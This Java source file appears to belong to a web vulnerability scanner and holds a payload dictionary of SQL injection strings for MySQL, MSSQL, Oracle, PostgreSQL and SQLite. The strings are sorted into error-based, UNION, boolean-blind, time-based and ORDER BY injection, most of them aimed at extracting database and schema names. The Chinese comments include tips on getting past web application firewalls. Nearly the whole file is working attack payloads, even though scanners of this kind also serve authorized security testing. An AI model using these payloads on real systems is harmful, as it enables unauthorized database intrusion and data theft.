package com.xzhscan.dictionary;

import java.util.List;
import java.util.Map;
import java.util.LinkedHashMap;
import java.util.stream.Collectors;

/**
 * SQL 注入字典（Dictionary 页签 · SQL库名注入子页）。
 *
 * 结构（v3.8）：分类 = 「DBMS·注入类型」（下拉点选如「MySQL·报错注入」即见该方法
 * 全部条目）；每条 payload 正文标注「字符型：… / 数字型：…」两种上下文形态。
 *
 * 口径（沿 v3.7.1）：布尔差分只保留 AND 1=1 / AND 1=2 型简单真/假对照
 * （不收录 MID/ORD/LENGTH 逐位提取型）；报错/UNION 回显为主力出库名组；
 * 每类 DBMS 附时间盲注。语句形态参考 sqlmap queries.xml 与常用报错函数包装。
 */
public final class SqlDict {

    private SqlDict() {
    }

    /** 分类（DBMS·注入类型）→ 条目。 */
    private static final Map<String, List<DictEntry>> BY_CATEGORY = build();

    public static List<DictEntry> all() {
        return BY_CATEGORY.values().stream().flatMap(List::stream).collect(Collectors.toList());
    }

    public static List<String> categories() {
        return List.copyOf(BY_CATEGORY.keySet());
    }

    public static List<DictEntry> byCategory(String cat) {
        List<DictEntry> list = BY_CATEGORY.get(cat);
        return list == null ? List.of() : List.copyOf(list);
    }

    private static Map<String, List<DictEntry>> build() {
        Map<String, List<DictEntry>> m = new LinkedHashMap<>();

        // ================= MySQL =================
        m.put("MySQL·报错注入", List.of(
                new DictEntry("MySQL·报错注入", "extractvalue（XPATH 回显）",
                        "字符型：' AND extractvalue(1,concat(0x7e,(SELECT DATABASE()),0x7e))-- -\n"
                                + "数字型：1 AND extractvalue(1,concat(0x7e,(SELECT DATABASE()),0x7e))",
                        "XPATH syntax error 回显 ~库名~；32 字符截断，长名用 MID 分段；MySQL ≥5.1"),
                new DictEntry("MySQL·报错注入", "updatexml（XPATH 回显）",
                        "字符型：' AND updatexml(1,concat(0x7e,(SELECT DATABASE()),0x7e),1)-- -\n"
                                + "数字型：1 AND updatexml(1,concat(0x7e,(SELECT DATABASE()),0x7e),1)",
                        "同 extractvalue；MySQL ≥5.1.5"),
                new DictEntry("MySQL·报错注入", "floor 主键重复（GROUP BY）",
                        "字符型：' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x7e,"
                                + "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -\n"
                                + "数字型：1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x7e,"
                                + "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)",
                        "Duplicate entry '~库名~1'；MySQL 5.0-5.5 经典"),
                new DictEntry("MySQL·报错注入", "EXP bigint 溢出",
                        "字符型：' AND EXP(~(SELECT * FROM (SELECT DATABASE())x))-- -\n"
                                + "数字型：1 AND EXP(~(SELECT * FROM (SELECT DATABASE())x))",
                        "DOUBLE value is out of range 回显；MySQL 5.5.5+；WAF 常漏报 EXP"),
                new DictEntry("MySQL·报错注入", "JSON 函数报错变体",
                        "字符型：' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x7e,"
                                + "(SELECT 1 FROM (SELECT JSON_KEYS('{}'))x))x FROM INFORMATION_SCHEMA.TABLES "
                                + "GROUP BY x)a)-- -\n"
                                + "数字型：1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT DATABASE()),0x7e,"
                                + "(SELECT 1 FROM (SELECT JSON_KEYS('{}'))x))x FROM INFORMATION_SCHEMA.TABLES "
                                + "GROUP BY x)a)",
                        "MySQL 5.7 JSON 函数报错变体，过部分关键字过滤")));
        m.put("MySQL·UNION注入", List.of(
                new DictEntry("MySQL·UNION注入", "出库名",
                        "字符型：' UNION SELECT 1,DATABASE(),3-- -\n"
                                + "数字型：1 UNION SELECT 1,DATABASE(),3",
                        "列数/回显位按目标调整（数字型需先 ORDER BY 探列数）"),
                new DictEntry("MySQL·UNION注入", "一次拉出全部库名",
                        "字符型：' UNION SELECT 1,(SELECT GROUP_CONCAT(schema_name) FROM "
                                + "INFORMATION_SCHEMA.SCHEMATA),3-- -\n"
                                + "数字型：1 UNION SELECT 1,(SELECT GROUP_CONCAT(schema_name) FROM "
                                + "INFORMATION_SCHEMA.SCHEMATA),3",
                        "回显列替换为 GROUP_CONCAT")));
        m.put("MySQL·布尔盲注差分", List.of(
                new DictEntry("MySQL·布尔盲注差分", "简单真/假对照（探路）",
                        "真·数字型：1 AND 1=1\n"
                                + "假·数字型：1 AND 1=2\n"
                                + "真·字符型：' AND 'a'='a-- -\n"
                                + "假·字符型：' AND 'a'='b-- -",
                        "真页/假页内容差分即可盲注取数；注释符按位置选 -- - 或 #")));
        m.put("MySQL·时间盲注", List.of(
                new DictEntry("MySQL·时间盲注", "SLEEP 延时",
                        "数字型：1 AND SLEEP(5)\n"
                                + "字符型：' AND SLEEP(5)-- -\n"
                                + "强制求值：' OR SLEEP(5)-- -",
                        "响应 ≥5s 即注入点成立；AND 短路不延时时换 OR")));
        m.put("MySQL·ORDER BY 注入", List.of(
                new DictEntry("MySQL·ORDER BY 注入", "形态说明（逗号接排序位）",
                        "原值：ORDER BY id\n"
                                + "注入：ORDER BY id,(payload)   # payload 以逗号开头接子查询作第二个排序位\n"
                                + "或替换：ORDER BY (payload)",
                        "ORDER BY 后不能接 AND/OR；报错/延时全靠子查询内 CASE 分支"),
                new DictEntry("MySQL·ORDER BY 注入", "布尔差分（成对）",
                        "真：,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.PLUGINS) END))\n"
                                + "假：,(SELECT (CASE WHEN (1=2) THEN 1 ELSE 1*(SELECT 1 FROM INFORMATION_SCHEMA.PLUGINS) END))",
                        "真=正常排序；假=子查询报错→响应差分（sqlmap 原版；[ORIGVALUE] 形态把 THEN 1 换成原列值可校验注入位）"),
                new DictEntry("MySQL·ORDER BY 注入", "时间盲注（SLEEP）",
                        ",(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))",
                        "sqlmap 原版形态；旧版 MySQL(<5.0.12) 换 BENCHMARK(5000000,MD5('x'))；假分支不延时作对照")));

        // ================= MSSQL =================
        m.put("MSSQL·报错注入", List.of(
                new DictEntry("MSSQL·报错注入", "CONVERT（类型转换回显）",
                        "字符型：' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -\n"
                                + "数字型：1=CONVERT(int,(SELECT DB_NAME()))",
                        "Conversion failed when converting 回显库名"),
                new DictEntry("MSSQL·报错注入", "CAST（类型转换回显）",
                        "字符型：' AND 1=CAST((SELECT DB_NAME()) AS int)-- -\n"
                                + "数字型：1=CAST((SELECT DB_NAME()) AS int)",
                        "同 CONVERT 形态"),
                new DictEntry("MSSQL·报错注入", "HAVING / GROUP BY 列枚举",
                        "字符型：' HAVING 1=1-- -\n"
                                + "数字型：1 HAVING 1=1-- -",
                        "报「列 X 不在选择列表中」逐列泄露；全列补齐后可聚合 (SELECT DB_NAME()) 回显"),
                new DictEntry("MSSQL·报错注入", "类型冲突拼接回显",
                        "字符型：' AND (SELECT DB_NAME())+0x1=0x1-- -\n"
                                + "数字型：1=(SELECT 1 WHERE (SELECT DB_NAME())=DB_NAME())",
                        "nvarchar 与二进制拼接冲突报错形态")));
        m.put("MSSQL·UNION注入", List.of(
                new DictEntry("MSSQL·UNION注入", "出库名",
                        "字符型：' UNION SELECT NULL,DB_NAME(),NULL-- -\n"
                                + "数字型：1 UNION SELECT NULL,DB_NAME(),NULL",
                        "回显列位置按目标调整"),
                new DictEntry("MSSQL·UNION注入", "一次拉出全部库名",
                        "字符型：' UNION SELECT NULL,(SELECT name+0x2c FROM master..sysdatabases "
                                + "FOR XML PATH('')),NULL-- -\n"
                                + "数字型：1 UNION SELECT NULL,(SELECT name+0x2c FROM master..sysdatabases "
                                + "FOR XML PATH('')),NULL",
                        "FOR XML PATH 拼串")));
        m.put("MSSQL·布尔盲注差分", List.of(
                new DictEntry("MSSQL·布尔盲注差分", "简单真/假对照（探路）",
                        "真·数字型：1 AND 1=1\n"
                                + "假·数字型：1 AND 1=2\n"
                                + "真·字符型：' AND 'a'='a-- -\n"
                                + "假·字符型：' AND 'a'='b-- -",
                        "真页/假页内容差分判别；注释符 --")));
        m.put("MSSQL·时间盲注", List.of(
                new DictEntry("MSSQL·时间盲注", "WAITFOR DELAY（需堆叠）",
                        "数字型：1;WAITFOR DELAY '0:0:5'-- -\n"
                                + "字符型：';WAITFOR DELAY '0:0:5'-- -",
                        "WAITFOR 只能堆叠执行（ADO/DAO 拼接场景大多可用）")));
        m.put("MSSQL·ORDER BY 注入", List.of(
                new DictEntry("MSSQL·ORDER BY 注入", "布尔差分（成对）",
                        "真：,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 1 END))\n"
                                + "假：,(SELECT (CASE WHEN (1=2) THEN 1 ELSE 1*(SELECT 1 UNION ALL SELECT 2) END))",
                        "假分支子查询多行→\"Subquery returned more than 1 value\" 报错差分（sqlmap 原版形态）"),
                new DictEntry("MSSQL·ORDER BY 注入", "时间盲注（heavy query）",
                        ",(SELECT (CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,"
                                + "sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,"
                                + "sysusers AS sys7) ELSE 1 END))",
                        "sqlmap 原版 heavy query（大笛卡尔积拖时）；WAITFOR 无法在 ORDER BY 位直接用（走堆叠）")));

        // ================= Oracle =================
        m.put("Oracle·报错注入", List.of(
                new DictEntry("Oracle·报错注入", "UTL_INADDR（主机解析回显）",
                        "字符型：' AND 1=(SELECT UTL_INADDR.get_host_name((SELECT USER FROM DUAL)) FROM DUAL)--\n"
                                + "数字型：1=1 AND (SELECT LENGTH(UTL_INADDR.get_host_name((SELECT USER FROM "
                                + "DUAL))) FROM DUAL)>0",
                        "ORA-29225 回显参数；需 EXECUTE 权限，无权限换 DRITHSX"),
                new DictEntry("Oracle·报错注入", "CTXSYS.DRITHSX.SN（索引报错回显）",
                        "字符型：' AND 1=(SELECT CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL)) FROM DUAL)--\n"
                                + "数字型：1=1 AND (SELECT LENGTH(CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))) "
                                + "FROM DUAL)>0",
                        "ORA-20000 回显；9iR2-11g 常用"),
                new DictEntry("Oracle·报错注入", "XMLType（XML 解析回显）",
                        "字符型：' AND 1=(SELECT XMLType('<a><![CDATA['||(SELECT USER FROM DUAL)||']]></a>') "
                                + "FROM DUAL)--\n"
                                + "数字型：1=1 AND (SELECT LENGTH(XMLType('<a><![CDATA['||(SELECT USER FROM DUAL)"
                                + "||']]></a>')) FROM DUAL)>0",
                        "XML 解析错误回显")));
        m.put("Oracle·UNION注入", List.of(
                new DictEntry("Oracle·UNION注入", "出 schema 名",
                        "字符型：' UNION SELECT NULL,(SELECT USER FROM DUAL),NULL FROM DUAL--\n"
                                + "数字型：1 UNION SELECT NULL,(SELECT USER FROM DUAL),NULL FROM DUAL--",
                        "NULL 占位补齐列数"),
                new DictEntry("Oracle·UNION注入", "一次拉出全部用户/schema",
                        "字符型：' UNION SELECT NULL,XMLAGG(XMLPARSE(CONTENT owner||',' WELLFORMED))"
                                + ".GETCLOBVAL(),NULL FROM all_users--\n"
                                + "数字型：1 UNION SELECT NULL,XMLAGG(XMLPARSE(CONTENT owner||',' WELLFORMED))"
                                + ".GETCLOBVAL(),NULL FROM all_users--",
                        "all_users 全量拼接")));
        m.put("Oracle·布尔盲注差分", List.of(
                new DictEntry("Oracle·布尔盲注差分", "简单真/假对照（探路）",
                        "真·数字型：1 AND 1=1\n"
                                + "假·数字型：1 AND 1=2\n"
                                + "真·字符型：' AND 'a'='a--\n"
                                + "假·字符型：' AND 'a'='b--",
                        "真页/假页内容差分判别；Oracle 注释符 --（无 #）")));
        m.put("Oracle·时间盲注", List.of(
                new DictEntry("Oracle·时间盲注", "DBMS_PIPE.RECEIVE_MESSAGE（管道等待）",
                        "数字型：1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--\n"
                                + "字符型：' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                        "Oracle 无 sleep 函数，管道等待 5s；有 DBMS_LOCK 权限改 DBMS_LOCK.SLEEP(5)")));
        m.put("Oracle·ORDER BY 注入", List.of(
                new DictEntry("Oracle·ORDER BY 注入", "布尔差分（成对）",
                        "真：,(SELECT (CASE WHEN (1=1) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)\n"
                                + "假：,(SELECT (CASE WHEN (1=2) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
                        "假分支除零 ORA-01476 报错差分（sqlmap 原版形态，须带 FROM DUAL）"),
                new DictEntry("Oracle·ORDER BY 注入", "时间盲注（DBMS_PIPE）",
                        ",(SELECT (CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END) FROM DUAL)",
                        "sqlmap 原版形态；亦提供 DBMS_LOCK.SLEEP 与 heavy query 变体")));

        // ================= PostgreSQL =================
        m.put("PostgreSQL·报错注入", List.of(
                new DictEntry("PostgreSQL·报错注入", "CAST（类型转换回显）",
                        "字符型：' AND 1=CAST(current_database() AS NUMERIC)-- -\n"
                                + "数字型：1=CAST(current_database() AS NUMERIC)",
                        "invalid input syntax for type numeric: \"库名\" 回显"),
                new DictEntry("PostgreSQL·报错注入", ":: 强转（等价 CAST）",
                        "字符型：' AND (SELECT current_database()::int)=1-- -\n"
                                + "数字型：1=(SELECT current_database()::int)",
                        "PG 双冒号强转形态，部分 WAF 规则与 CAST 不同"),
                new DictEntry("PostgreSQL·报错注入", "除零回显",
                        "字符型：' AND (SELECT 1/(SELECT 0 WHERE 1=(SELECT 1 FROM pg_database WHERE "
                                + "datname=current_database())))=1-- -\n"
                                + "数字型：1=(SELECT 1/(SELECT 0))",
                        "division by zero 变体")));
        m.put("PostgreSQL·UNION注入", List.of(
                new DictEntry("PostgreSQL·UNION注入", "出库名",
                        "字符型：' UNION SELECT NULL,current_database(),NULL-- -\n"
                                + "数字型：1 UNION SELECT NULL,current_database(),NULL",
                        "回显列位置按目标调整"),
                new DictEntry("PostgreSQL·UNION注入", "一次拉出全部库名",
                        "字符型：' UNION SELECT NULL,string_agg(datname,0x2c),NULL FROM pg_database-- -\n"
                                + "数字型：1 UNION SELECT NULL,string_agg(datname,0x2c),NULL FROM pg_database",
                        "PG 9.0+ string_agg；旧版用 array_to_string(ARRAY(...))")));
        m.put("PostgreSQL·布尔盲注差分", List.of(
                new DictEntry("PostgreSQL·布尔盲注差分", "简单真/假对照（探路）",
                        "真·数字型：1 AND 1=1\n"
                                + "假·数字型：1 AND 1=2\n"
                                + "真·字符型：' AND 'a'='a-- -\n"
                                + "假·字符型：' AND 'a'='b-- -",
                        "真页/假页内容差分判别；注释符 --")));
        m.put("PostgreSQL·时间盲注", List.of(
                new DictEntry("PostgreSQL·时间盲注", "pg_sleep",
                        "数字型：1 AND (SELECT pg_sleep(5)) IS NOT NULL\n"
                                + "字符型：';SELECT pg_sleep(5)-- -",
                        "数字型为非堆叠形态（不依赖多语句）；字符型为堆叠形态；pg_sleep 返回 void，恒 NULL 值比较")));
        m.put("PostgreSQL·ORDER BY 注入", List.of(
                new DictEntry("PostgreSQL·ORDER BY 注入", "布尔差分（成对）",
                        "真：,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END))\n"
                                + "假：,(SELECT (CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END))",
                        "假分支除零报错差分（sqlmap 原版形态）；[ORIGVALUE] 形态 THEN 换原列值校验注入位"),
                new DictEntry("PostgreSQL·ORDER BY 注入", "时间盲注（pg_sleep / GENERATE_SERIES）",
                        ",(SELECT (CASE WHEN (1=1) THEN (SELECT 5 FROM PG_SLEEP(5)) ELSE 1/(SELECT 0) END))\n"
                                + "变体：,(SELECT * FROM GENERATE_SERIES(1,1,CASE WHEN (1=1) THEN 1 ELSE 0 END) LIMIT 1)",
                        "sqlmap 原版两种形态；GENERATE_SERIES 用步长 0 挂起生成器")));

        // ================= SQLite =================
        m.put("SQLite·报错注入", List.of(
                new DictEntry("SQLite·报错注入", "说明：无报错回显函数",
                        "SQLite 3.x 无内置报错回显函数（无 extractvalue 等价物）。",
                        "出表名走 UNION 组；差分验证走布尔差分/时间盲注组")));
        m.put("SQLite·UNION注入", List.of(
                new DictEntry("SQLite·UNION注入", "一次拉出全部表名",
                        "字符型：' UNION SELECT 1,(SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master "
                                + "WHERE type='table'),3-- -\n"
                                + "数字型：1 UNION SELECT 1,(SELECT GROUP_CONCAT(tbl_name) FROM sqlite_master "
                                + "WHERE type='table'),3",
                        "回显列位置按目标调整"),
                new DictEntry("SQLite·UNION注入", "建表语句（含全部列）",
                        "字符型：' UNION SELECT 1,(SELECT MAX(sql) FROM sqlite_master WHERE type='table'),3-- -\n"
                                + "数字型：1 UNION SELECT 1,(SELECT MAX(sql) FROM sqlite_master WHERE "
                                + "type='table'),3",
                        "一条语句拿全 schema")));
        m.put("SQLite·布尔盲注差分", List.of(
                new DictEntry("SQLite·布尔盲注差分", "简单真/假对照（探路）",
                        "真·数字型：1 AND 1=1\n"
                                + "假·数字型：1 AND 1=2\n"
                                + "真·字符型：' AND 'a'='a-- -\n"
                                + "假·字符型：' AND 'a'='b-- -",
                        "真页/假页内容差分判别；注释符 --")));
        m.put("SQLite·时间盲注", List.of(
                new DictEntry("SQLite·时间盲注", "RANDOMBLOB 大计算延时",
                        "数字型：1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))\n"
                                + "字符型：' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
                        "SQLite 无 sleep：RANDOMBLOB 大计算拖慢响应；v3.8.3 起引擎不再自动发送（资源不可控），仅作手动 Repeater 参考")));
        m.put("SQLite·ORDER BY 注入", List.of(
                new DictEntry("SQLite·ORDER BY 注入", "布尔差分（成对）",
                        "真：,(CASE WHEN 1=1 THEN 1 ELSE 2 END)\n"
                                + "假：,(CASE WHEN 1=2 THEN 1 ELSE 2 END)",
                        "排序位值 1/2 变化 → 首行内容差分（SQLite 无报错回显，只能排序值差分）"),
                new DictEntry("SQLite·ORDER BY 注入", "时间盲注（RANDOMBLOB 大计算）",
                        ",(RANDOMBLOB(500000000/2))",
                        "排序位恒计算大 blob 拖时；与原请求耗时对照判别；同 XzhScan Registry 口径")));

        return m;
    }
}
